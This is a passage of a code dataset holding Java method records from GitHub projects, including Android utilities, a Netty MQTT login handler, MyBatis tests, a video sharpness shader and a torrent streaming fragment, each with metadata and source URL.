{"id": 32209, "method_name": "dateFormat", "class_name": "Utility", "params": ["String", "String"], "throws": null, "modifiers": ["final", "public", "static"], "return_type": "String", "snippet": "    public static final String dateFormat(String format, String dateInput){\n        SimpleDateFormat inputFormat = new SimpleDateFormat(\"yyyy-MM-dd'T'HH:mm:ss'Z'\");\n        SimpleDateFormat outputFormat = new SimpleDateFormat(format);\n        Date date = null;\n        try{\n            date = inputFormat.parse(dateInput);\n        }catch (ParseException e){\n            Log.e(\"ParseException : \", e.getMessage());\n        }\n        return outputFormat.format(date);\n    }", "url": "https://raw.githubusercontent.com/fadhilahramadhan/Android_Covid19Stats/master/app/src/main/java/fadhilah/ramadhan/covid19stats/util/Utility.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32210, "method_name": "setListViewHeight", "class_name": "Utility", "params": ["ListView"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void setListViewHeight(ListView listView) {\n        ListAdapter listAdapter = listView.getAdapter();\n        if (listAdapter == null) {\n            return;\n        }\n\n        int totalHeight = listView.getPaddingTop() + listView.getPaddingBottom();\n        for (int i = 0; i < listAdapter.getCount(); i++) {\n            View listItem = listAdapter.getView(i, null, listView);\n            if (listItem instanceof ViewGroup)\n                listItem.setLayoutParams(new ViewGroup.LayoutParams(ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT));\n            listItem.measure(0, 0);\n            totalHeight += listItem.getMeasuredHeight();\n        }\n\n        ViewGroup.LayoutParams params = listView.getLayoutParams();\n        params.height = totalHeight + (listView.getDividerHeight() * (listAdapter.getCount() - 1));\n        listView.setLayoutParams(params);\n    }", "url": "https://raw.githubusercontent.com/fadhilahramadhan/Android_Covid19Stats/master/app/src/main/java/fadhilah/ramadhan/covid19stats/util/Utility.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32211, "method_name": "StringContainAnywhere", "class_name": "Utility", "params": ["String", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean StringContainAnywhere(String param, String search){\n        return param.toLowerCase().matches(\"(?i).*\"+ search.toLowerCase() +\".*\");\n    }", "url": "https://raw.githubusercontent.com/fadhilahramadhan/Android_Covid19Stats/master/app/src/main/java/fadhilah/ramadhan/covid19stats/util/Utility.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32212, "method_name": "cekValidResult", "class_name": "Utility", "params": ["String", "Activity"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean  cekValidResult(String result, Activity activity){\n\n        try{\n            if(!result.contains(\"errorCode\")){\n                return true;\n            }else{\n                JSONObject jsonObject = new JSONObject(result);\n                if(jsonObject.has(\"errorCode\")){\n                    String errorCode = jsonObject.getString(\"errorCode\");\n                    String message = jsonObject.getString(\"fullMessage\");\n\n                        AlertDialogCustom dialogs = new AlertDialogCustom(activity);\n                        dialogs.setTitleandContent(activity.getString(R.string.header_message), message, activity.getString(R.string.button_close));\n\n                    return false;\n                }else{\n                }\n            }\n        }catch (JSONException e) {\n            e.printStackTrace();\n            AlertDialogCustom dialogs = new AlertDialogCustom(activity);\n            dialogs.setTitleandContent(activity.getString(R.string.header_message), activity.getString(R.string.message_gagal), activity.getString(R.string.button_close));\n            return false;\n        }catch (Exception e) {\n            e.printStackTrace();\n            AlertDialogCustom dialogs = new AlertDialogCustom(activity);\n            dialogs.setTitleandContent(activity.getString(R.string.header_message), activity.getString(R.string.message_gagal), activity.getString(R.string.button_close));\n\n            return false;\n        }\n        return true;\n    }", "url": "https://raw.githubusercontent.com/fadhilahramadhan/Android_Covid19Stats/master/app/src/main/java/fadhilah/ramadhan/covid19stats/util/Utility.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32213, "method_name": "setLocale", "class_name": "Utility", "params": ["String", "Context", "Activity"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void setLocale(String lang, Context context, Activity activity) {\n\n        SharedPreferences mSettings = PreferenceManager.getDefaultSharedPreferences(activity);\n        SharedPreferences.Editor editor = mSettings.edit();\n        editor.putString(\"lang\", lang);\n        editor.apply();\n\n        Locale myLocale = new Locale(lang);\n        Resources res = context.getResources();\n        DisplayMetrics dm = res.getDisplayMetrics();\n        Configuration conf = res.getConfiguration();\n        conf.locale = myLocale;\n        res.updateConfiguration(conf, dm);\n    }", "url": "https://raw.githubusercontent.com/fadhilahramadhan/Android_Covid19Stats/master/app/src/main/java/fadhilah/ramadhan/covid19stats/util/Utility.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32214, "method_name": "process", "class_name": "MqttConnectHandler", "params": ["Channel", "MqttConnectMessage"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void process(Channel channel, MqttConnectMessage msg) {\n        // \u6d88\u606f\u89e3\u7801\u5668\u51fa\u73b0\u5f02\u5e38\n        if (msg.decoderResult().isFailure()) {\n            Throwable cause = msg.decoderResult().cause();\n            log.error(cause);\n            if (cause instanceof MqttUnacceptableProtocolVersionException) {\n                MqttConnAckMessage connAckMessage = (MqttConnAckMessage) MqttMessageFactory.newMessage(\n                        new MqttFixedHeader(MqttMessageType.CONNACK, false, MqttQoS.AT_MOST_ONCE, false, 0),\n                        new MqttConnAckVariableHeader(MqttConnectReturnCode.CONNECTION_REFUSED_UNACCEPTABLE_PROTOCOL_VERSION, false), null);\n                channel.writeAndFlush(connAckMessage);\n                log.error(\"\u4e0d\u652f\u6301\u7684\u534f\u8bae\u7248\u672c\");\n                channel.close();\n                return;\n            } else if (cause instanceof MqttIdentifierRejectedException) {\n                log.error(\"\u4e0d\u5408\u683c\u7684clientId\");\n                MqttConnAckMessage connAckMessage = (MqttConnAckMessage) MqttMessageFactory.newMessage(\n                        new MqttFixedHeader(MqttMessageType.CONNACK, false, MqttQoS.AT_MOST_ONCE, false, 0),\n                        new MqttConnAckVariableHeader(MqttConnectReturnCode.CONNECTION_REFUSED_IDENTIFIER_REJECTED, false), null);\n                channel.writeAndFlush(connAckMessage);\n                channel.close();\n                return;\n            }\n            channel.close();\n            return;\n        }\n\n        // clientId\u4e3a\u7a7a\u6216null\u7684\u60c5\u51b5, \u8fd9\u91cc\u8981\u6c42\u5ba2\u6237\u7aef\u5fc5\u987b\u63d0\u4f9bclientId, \u4e0d\u7ba1cleanSession\u662f\u5426\u4e3a1, \u6b64\u5904\u6ca1\u6709\u53c2\u8003\u6807\u51c6\u534f\u8bae\u5b9e\u73b0\n        if (StrUtil.isBlank(msg.payload().clientIdentifier())) {\n            MqttConnAckMessage connAckMessage = (MqttConnAckMessage) MqttMessageFactory.newMessage(\n                    new MqttFixedHeader(MqttMessageType.CONNACK, false, MqttQoS.AT_MOST_ONCE, false, 0),\n                    new MqttConnAckVariableHeader(MqttConnectReturnCode.CONNECTION_REFUSED_IDENTIFIER_REJECTED, false), null);\n            channel.writeAndFlush(connAckMessage);\n            log.error(\"\u65e0\");\n            channel.close();\n            return;\n        }\n\n        // \u7528\u6237\u540d\u548c\u5bc6\u7801\u9a8c\u8bc1, \u8fd9\u91cc\u8981\u6c42\u5ba2\u6237\u7aef\u8fde\u63a5\u65f6\u5fc5\u987b\u63d0\u4f9b\u7528\u6237\u540d\u548c\u5bc6\u7801, \u4e0d\u7ba1\u662f\u5426\u8bbe\u7f6e\u7528\u6237\u540d\u6807\u5fd7\u548c\u5bc6\u7801\u6807\u5fd7\u4e3a1, \u6b64\u5904\u6ca1\u6709\u53c2\u8003\u6807\u51c6\u534f\u8bae\u5b9e\u73b0\n        String username = msg.payload().userName();\n        String password = msg.payload().passwordInBytes() == null ? null : new String(msg.payload().passwordInBytes(), CharsetUtil.UTF_8);\n\n        SecurityUser userDetails = (SecurityUser) securityUserDetailsService.loadUserByUserId(Integer.parseInt(username));\n\n        if (!login(msg, password, userDetails)) {\n            MqttConnAckMessage connAckMessage = (MqttConnAckMessage) MqttMessageFactory.newMessage(\n                    new MqttFixedHeader(MqttMessageType.CONNACK, false, MqttQoS.AT_MOST_ONCE, false, 0),\n                    new MqttConnAckVariableHeader(MqttConnectReturnCode.CONNECTION_REFUSED_BAD_USER_NAME_OR_PASSWORD, false), null);\n            channel.writeAndFlush(connAckMessage);\n            log.error(\"\u5bc6\u7801\u9519\u8bef\");\n            channel.close();\n            return;\n        }\n\n        NettyUtil.setName(channel, msg.payload().clientIdentifier());\n        NettyUtil.setUser(channel, userDetails);\n\n        NettyMqttHandler.channels.add(channel);\n\n        MqttConnAckMessage okResp = (MqttConnAckMessage) MqttMessageFactory.newMessage(\n                new MqttFixedHeader(MqttMessageType.CONNACK, false, MqttQoS.AT_MOST_ONCE, false, 0),\n                new MqttConnAckVariableHeader(MqttConnectReturnCode.CONNECTION_ACCEPTED, false), null);\n        log.info(\"\u94fe\u63a5\u6210\u529f\");\n        channel.writeAndFlush(okResp);\n    }", "url": "https://raw.githubusercontent.com/taoroot/taoiot/master/src/main/java/com/github/taoroot/taoiot/netty/mqtt/impl/MqttConnectHandler.java", "stars": "6", "class_props": {"extends": null, "implements": ["MqttHandler"], "modifiers": ["public"]}}, {"id": 32215, "method_name": "login", "class_name": "MqttConnectHandler", "params": ["MqttConnectMessage", "String", "SecurityUser"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "    private boolean login(MqttConnectMessage msg, String password, SecurityUser userDetails) {\n        return userDetails != null && userDetails.getToken().equals(password)\n                && Validator.isGeneral(msg.payload().clientIdentifier());\n    }", "url": "https://raw.githubusercontent.com/taoroot/taoiot/master/src/main/java/com/github/taoroot/taoiot/netty/mqtt/impl/MqttConnectHandler.java", "stars": "6", "class_props": {"extends": null, "implements": ["MqttHandler"], "modifiers": ["public"]}}, {"id": 32216, "method_name": "initDatabase", "class_name": "ComplexColumnTest", "params": [], "throws": ["Exception"], "modifiers": ["static"], "return_type": "void", "snippet": "    static void initDatabase() throws Exception {\n        try (Reader reader = Resources.getResourceAsReader(\"org/apache/ibatis/submitted/complex_column/ibatisConfig.xml\")) {\n            sqlSessionFactory = new SqlSessionFactoryBuilder().build(reader);\n        }\n\n        BaseDataTest.runScript(sqlSessionFactory.getConfiguration().getEnvironment().getDataSource(),\n                \"org/apache/ibatis/submitted/complex_column/CreateDB.sql\");\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/complex_column/ComplexColumnTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 32217, "method_name": "testWithoutComplex", "class_name": "ComplexColumnTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void testWithoutComplex() {\n        try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n            PersonMapper personMapper = sqlSession.getMapper(PersonMapper.class);\n            Person person = personMapper.getWithoutComplex(2L);\n            Assertions.assertNotNull(person, \"person must not be null\");\n            Assertions.assertEquals(\"Christian\", person.getFirstName());\n            Assertions.assertEquals(\"Poitras\", person.getLastName());\n            Person parent = person.getParent();\n            Assertions.assertNotNull(parent, \"parent must not be null\");\n            Assertions.assertEquals(\"John\", parent.getFirstName());\n            Assertions.assertEquals(\"Smith\", parent.getLastName());\n        }\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/complex_column/ComplexColumnTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 32218, "method_name": "testWithComplex", "class_name": "ComplexColumnTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void testWithComplex() {\n        try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n            PersonMapper personMapper = sqlSession.getMapper(PersonMapper.class);\n            Person person = personMapper.getWithComplex(2L);\n            Assertions.assertNotNull(person, \"person must not be null\");\n            Assertions.assertEquals(\"Christian\", person.getFirstName());\n            Assertions.assertEquals(\"Poitras\", person.getLastName());\n            Person parent = person.getParent();\n            Assertions.assertNotNull(parent, \"parent must not be null\");\n            Assertions.assertEquals(\"John\", parent.getFirstName());\n            Assertions.assertEquals(\"Smith\", parent.getLastName());\n        }\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/complex_column/ComplexColumnTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 32219, "method_name": "testWithComplex2", "class_name": "ComplexColumnTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void testWithComplex2() {\n        try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n            PersonMapper personMapper = sqlSession.getMapper(PersonMapper.class);\n            Person person = personMapper.getWithComplex2(2L);\n            Assertions.assertNotNull(person, \"person must not be null\");\n            Assertions.assertEquals(\"Christian\", person.getFirstName());\n            Assertions.assertEquals(\"Poitras\", person.getLastName());\n            Person parent = person.getParent();\n            Assertions.assertNotNull(parent, \"parent must not be null\");\n            Assertions.assertEquals(\"John\", parent.getFirstName());\n            Assertions.assertEquals(\"Smith\", parent.getLastName());\n        }\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/complex_column/ComplexColumnTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 32220, "method_name": "testWithComplex3", "class_name": "ComplexColumnTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void testWithComplex3() {\n        try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n            PersonMapper personMapper = sqlSession.getMapper(PersonMapper.class);\n            Person person = personMapper.getWithComplex3(2L);\n            Assertions.assertNotNull(person, \"person must not be null\");\n            Assertions.assertEquals(\"Christian\", person.getFirstName());\n            Assertions.assertEquals(\"Poitras\", person.getLastName());\n            Person parent = person.getParent();\n            Assertions.assertNotNull(parent, \"parent must not be null\");\n            Assertions.assertEquals(\"John\", parent.getFirstName());\n            Assertions.assertEquals(\"Smith\", parent.getLastName());\n        }\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/complex_column/ComplexColumnTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 32221, "method_name": "testWithComplex4", "class_name": "ComplexColumnTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void testWithComplex4() {\n      try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n          PersonMapper personMapper = sqlSession.getMapper(PersonMapper.class);\n          Person criteria = new Person();\n          criteria.setFirstName(\"Christian\");\n          criteria.setLastName(\"Poitras\");\n          Person person = personMapper.getParentWithComplex(criteria);\n          Assertions.assertNotNull(person, \"person must not be null\");\n          Assertions.assertEquals(\"Christian\", person.getFirstName());\n          Assertions.assertEquals(\"Poitras\", person.getLastName());\n          Person parent = person.getParent();\n          Assertions.assertNotNull(parent, \"parent must not be null\");\n          Assertions.assertEquals(\"John\", parent.getFirstName());\n          Assertions.assertEquals(\"Smith\", parent.getLastName());\n      }\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/complex_column/ComplexColumnTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 32222, "method_name": "testWithParamAttributes", "class_name": "ComplexColumnTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void testWithParamAttributes() {\n        try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n            PersonMapper personMapper = sqlSession.getMapper(PersonMapper.class);\n            Person person = personMapper.getComplexWithParamAttributes(2L);\n            Assertions.assertNotNull(person, \"person must not be null\");\n            Assertions.assertEquals(\"Christian\", person.getFirstName());\n            Assertions.assertEquals(\"Poitras\", person.getLastName());\n            Person parent = person.getParent();\n            Assertions.assertNotNull(parent, \"parent must not be null\");\n            Assertions.assertEquals(\"John\", parent.getFirstName());\n            Assertions.assertEquals(\"Smith\", parent.getLastName());\n        }\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/complex_column/ComplexColumnTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 32223, "method_name": "initValues", "class_name": "SharpnessEffect", "params": ["GLSurfaceView"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void initValues(GLSurfaceView mGlSurfaceView) {\n        mWidth = mGlSurfaceView.getWidth();\n        mHeight = mGlSurfaceView.getHeight();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/effect/SharpnessEffect.java", "stars": "2", "class_props": {"extends": null, "implements": ["ShaderInterface"], "modifiers": ["public"]}}, {"id": 32224, "method_name": "getShader", "class_name": "SharpnessEffect", "params": ["GLSurfaceView"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getShader(GLSurfaceView mGlSurfaceView) {\n        initValues(mGlSurfaceView);\n\n        String stepsizeXString = \"stepsizeX = \" + 1.0f / mWidth + \";\\n\";\n        String stepsizeYString = \"stepsizeY = \" + 1.0f / mHeight + \";\\n\";\n        String scaleString = \"scale = \" + scale + \";\\n\";\n\n        String shader = \"#extension GL_OES_EGL_image_external : require\\n\"\n                + \"precision mediump float;\\n\"\n                + \"uniform samplerExternalOES sTexture;\\n\"\n                + \" float scale;\\n\"\n                + \" float stepsizeX;\\n\"\n                + \" float stepsizeY;\\n\"\n                + \"varying vec2 vTextureCoord;\\n\"\n                + \"void main() {\\n\"\n                // Parameters that were created above\n                + stepsizeXString\n                + stepsizeYString\n                + scaleString\n                + \"  vec3 nbr_color = vec3(0.0, 0.0, 0.0);\\n\"\n                + \"  vec2 coord;\\n\"\n                + \"  vec4 color = texture2D(sTexture, vTextureCoord);\\n\"\n                + \"  coord.x = vTextureCoord.x - 0.5 * stepsizeX;\\n\"\n                + \"  coord.y = vTextureCoord.y - stepsizeY;\\n\"\n                + \"  nbr_color += texture2D(sTexture, coord).rgb - color.rgb;\\n\"\n                + \"  coord.x = vTextureCoord.x - stepsizeX;\\n\"\n                + \"  coord.y = vTextureCoord.y + 0.5 * stepsizeY;\\n\"\n                + \"  nbr_color += texture2D(sTexture, coord).rgb - color.rgb;\\n\"\n                + \"  coord.x = vTextureCoord.x + stepsizeX;\\n\"\n                + \"  coord.y = vTextureCoord.y - 0.5 * stepsizeY;\\n\"\n                + \"  nbr_color += texture2D(sTexture, coord).rgb - color.rgb;\\n\"\n                + \"  coord.x = vTextureCoord.x + stepsizeX;\\n\"\n                + \"  coord.y = vTextureCoord.y + 0.5 * stepsizeY;\\n\"\n                + \"  nbr_color += texture2D(sTexture, coord).rgb - color.rgb;\\n\"\n                + \"  gl_FragColor = vec4(color.rgb - 2.0 * scale * nbr_color, color.a);\\n\"\n                + \"}\\n\";\n\n        return shader;\n\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/effect/SharpnessEffect.java", "stars": "2", "class_props": {"extends": null, "implements": ["ShaderInterface"], "modifiers": ["public"]}}, {"id": 32225, "method_name": "route", "class_name": "ExecutorRouteFailover", "params": ["TriggerParam", "List<String>"], "throws": null, "modifiers": ["public"], "return_type": "ReturnT<String>", "snippet": "    public ReturnT<String> route(TriggerParam triggerParam, List<String> addressList) {\n\n        StringBuffer beatResultSB = new StringBuffer();\n        for (String address : addressList) {\n            // beat\n            ReturnT<String> beatResult = null;\n            try {\n                ExecutorBiz executorBiz = XxlJobScheduler.getExecutorBiz(address);\n                beatResult = executorBiz.beat();\n            } catch (Exception e) {\n                logger.error(e.getMessage(), e);\n                beatResult = new ReturnT<String>(ReturnT.FAIL_CODE, \"\"+e );\n            }\n            beatResultSB.append( (beatResultSB.length()>0)?\"<br><br>\":\"\")\n                    .append(I18nUtil.getString(\"jobconf_beat\") + \"\uff1a\")\n                    .append(\"<br>address\uff1a\").append(address)\n                    .append(\"<br>code\uff1a\").append(beatResult.getCode())\n                    .append(\"<br>msg\uff1a\").append(beatResult.getMsg());\n\n            // beat success\n            if (beatResult.getCode() == ReturnT.SUCCESS_CODE) {\n\n                beatResult.setMsg(beatResultSB.toString());\n                beatResult.setContent(address);\n                return beatResult;\n            }\n        }\n        return new ReturnT<String>(ReturnT.FAIL_CODE, beatResultSB.toString());\n\n    }", "url": "https://raw.githubusercontent.com/miaoo92/xxl-job-mongo/master/src/main/java/com/avon/rga/core/route/strategy/ExecutorRouteFailover.java", "stars": "1", "class_props": {"extends": "ExecutorRouter", "implements": null, "modifiers": ["public"]}}, {"id": 32226, "method_name": "onCreate", "class_name": "BaseStreamLoadingFragment", "params": ["Bundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setRetainInstance(true);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseStreamLoadingFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["TorrentServerListener", "SubtitleDownloader", "SubsProvider"], "modifiers": ["public", "abstract"]}}, {"id": 32227, "method_name": "onActivityCreated", "class_name": "BaseStreamLoadingFragment", "params": ["Bundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onActivityCreated(@Nullable Bundle savedInstanceState) {\n        super.onActivityCreated(savedInstanceState);\n\n        ThreadUtils.runOnUiThread(new Runnable() {\n            @Override\n            public void run() {\n                mStreamInfo = mCallback.getStreamInformation();\n                if (mStreamInfo == null) {\n                    getActivity().finish();\n                    return;\n                }\n                loadSubtitles();\n            }\n        });\n\n        if (!(getActivity() instanceof TorrentActivity)) {\n            throw new IllegalStateException(\"Parent activity is not a TorrentBaseActivity\");\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseStreamLoadingFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["TorrentServerListener", "SubtitleDownloader", "SubsProvider"], "modifiers": ["public", "abstract"]}}, {"id": 32228, "method_name": "onAttach", "class_name": "BaseStreamLoadingFragment", "params": ["Context"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onAttach(Context context) {\n        super.onAttach(context);\n        if (context instanceof FragmentListener) mCallback = (FragmentListener) context;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseStreamLoadingFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["TorrentServerListener", "SubtitleDownloader", "SubsProvider"], "modifiers": ["public", "abstract"]}}, {"id": 32229, "method_name": "onTorrentServiceConnected", "class_name": "BaseStreamLoadingFragment", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onTorrentServiceConnected() {\n        if(getActivity() == null)\n            return;\n\n        mService = ((TorrentActivity)getActivity()).getTorrentService();\n\n        if (streamLoadingActivityContext != null) {\n            mService.setStreamLoadingActivityContext(streamLoadingActivityContext);\n        }\n        if(mService != null) {\n            mService.addListener(this);\n            startStream();\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseStreamLoadingFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["TorrentServerListener", "SubtitleDownloader", "SubsProvider"], "modifiers": ["public", "abstract"]}}, {"id": 32230, "method_name": "setStreamLoadingActivityContext", "class_name": "BaseStreamLoadingFragment", "params": ["Context"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setStreamLoadingActivityContext(Context context) {\n        streamLoadingActivityContext = context;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseStreamLoadingFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["TorrentServerListener", "SubtitleDownloader", "SubsProvider"], "modifiers": ["public", "abstract"]}}, {"id": 32231, "method_name": "onTorrentServiceDisconnected", "class_name": "BaseStreamLoadingFragment", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onTorrentServiceDisconnected() {\n        if(mService != null) {\n            mService.removeListener(this);\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseStreamLoadingFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["TorrentServerListener", "SubtitleDownloader", "SubsProvider"], "modifiers": ["public", "abstract"]}}, {"id": 32232, "method_name": "onPause", "class_name": "BaseStreamLoadingFragment", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onPause() {\n        super.onPause();\n        if (null != mService) {\n            mService.removeListener(this);\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseStreamLoadingFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["TorrentServerListener", "SubtitleDownloader", "SubsProvider"], "modifiers": ["public", "abstract"]}}, {"id": 32233, "method_name": "onDestroy", "class_name": "BaseStreamLoadingFragment", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onDestroy() {\n        super.onDestroy();\n\n        if (null != mService) {\n            mService.stopStreaming();\n            mService.removeListener(this);\n            mService.stopService();\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseStreamLoadingFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["TorrentServerListener", "SubtitleDownloader", "SubsProvider"], "modifiers": ["public", "abstract"]}}, {"id": 32234, "method_name": "updateView", "class_name": "BaseStreamLoadingFragment", "params": ["State", "Object"], "throws": null, "modifiers": ["abstract", "protected"], "return_type": "void", "snippet": "    protected abstract void updateView(State state, Object extra);\n\n    /**\n     * Start the internal player for a streaming torrent\n     *\n     * @param location Location\n     * @param resumePosition Resume position\n     */\n    protected abstract void startPlayerActivity(String location, int resumePosition);\n\n    @DebugLog\n    protected void setState(final State state) {\n        setState(state, null);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseStreamLoadingFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["TorrentServerListener", "SubtitleDownloader", "SubsProvider"], "modifiers": ["public", "abstract"]}}, {"id": 32235, "method_name": "startPlayerActivity", "class_name": "BaseStreamLoadingFragment", "params": ["String", "int"], "throws": null, "modifiers": ["abstract", "protected"], "return_type": "void", "snippet": "    protected abstract void startPlayerActivity(String location, int resumePosition);\n\n    @DebugLog\n    protected void setState(final State state) {\n        setState(state, null);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseStreamLoadingFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["TorrentServerListener", "SubtitleDownloader", "SubsProvider"], "modifiers": ["public", "abstract"]}}, {"id": 32236, "method_name": "setState", "class_name": "BaseStreamLoadingFragment", "params": ["State"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void setState(final State state) {\n        setState(state, null);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseStreamLoadingFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["TorrentServerListener", "SubtitleDownloader", "SubsProvider"], "modifiers": ["public", "abstract"]}}, {"id": 32237, "method_name": "setState", "class_name": "BaseStreamLoadingFragment", "params": ["State", "Object"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void setState(final State state, final Object extra) {\n        mState = state;\n\n        ThreadUtils.runOnUiThread(new Runnable() {\n            @Override\n            public void run() {\n                updateView(state, extra);\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseStreamLoadingFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["TorrentServerListener", "SubtitleDownloader", "SubsProvider"], "modifiers": ["public", "abstract"]}}, {"id": 32238, "method_name": "startPlayer", "class_name": "BaseStreamLoadingFragment", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void startPlayer(String location) {\n        if (mHasSubs && mSubsStatus == SubsStatus.DOWNLOADING) {\n            ThreadUtils.runOnUiThread(new Runnable() {\n                @Override\n                public void run() {\n                    setState(State.WAITING_SUBTITLES);\n                }\n            });\n            return;\n        }\n\n        if (!mPlayerStarted) {\n            mService.removeListener(BaseStreamLoadingFragment.this);\n            startPlayerActivity(location, 0);\n\n            mPlayerStarted = true;\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseStreamLoadingFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["TorrentServerListener", "SubtitleDownloader", "SubsProvider"], "modifiers": ["public", "abstract"]}}, {"id": 32239, "method_name": "onResume", "class_name": "BaseStreamLoadingFragment", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onResume() {\n        super.onResume();\n        if (mPlayerStarted) {\n            if(!mPlayingExternal)\n                getActivity().onBackPressed();\n        }\n\n        if(mService != null && mService.isStreaming() && mService.isReady()) {\n            onStreamReady(mService.getCurrentTorrent());\n            